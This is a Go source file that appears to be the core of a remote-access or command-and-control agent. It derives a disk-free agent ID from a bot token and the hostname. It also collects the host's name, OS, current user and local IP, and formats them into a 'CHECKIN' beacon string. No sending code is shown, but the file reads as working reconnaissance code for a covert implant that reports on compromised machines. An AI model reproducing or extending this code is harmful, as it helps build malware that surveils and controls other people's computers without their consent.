package core

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
)

// ─────────────────────────────────────────
// Agent Identity — deterministic, no files on disk
// ─────────────────────────────────────────

// AgentID generates a unique 8-char hex ID by hashing the bot token + hostname.
// Deterministic: same inputs → same ID every time. No file stored on disk.
func AgentID(token string) string {
	hostname, _ := os.Hostname()
	data := token + "|" + hostname
	hash := sha256.Sum256([]byte(data))
	return hex.EncodeToString(hash[:])[:8]
}

// ─────────────────────────────────────────
// Host Information
// ─────────────────────────────────────────

type HostInfo struct {
	Hostname string
	OS       string
	User     string
	IP       string
}

func GetHostInfo() HostInfo {
	info := HostInfo{
		OS: runtime.GOOS + "/" + runtime.GOARCH,
	}

	if h, err := os.Hostname(); err == nil {
		info.Hostname = h
	} else {
		info.Hostname = "unknown"
	}

	if u, err := user.Current(); err == nil {
		info.User = u.Username
	} else {
		info.User = "unknown"
	}

	info.IP = getLocalIP()
	return info
}

func BuildCheckin(agentID string) string {
	h := GetHostInfo()
	return fmt.Sprintf("CHECKIN|%s|%s|%s|%s|%s", agentID, h.Hostname, h.OS, h.User, h.IP)
}

func getLocalIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		addrs, _ := net.InterfaceAddrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
		return "unknown"
	}
	defer conn.Close()
	return conn.LocalAddr().(*net.UDPAddr).IP.String()
}
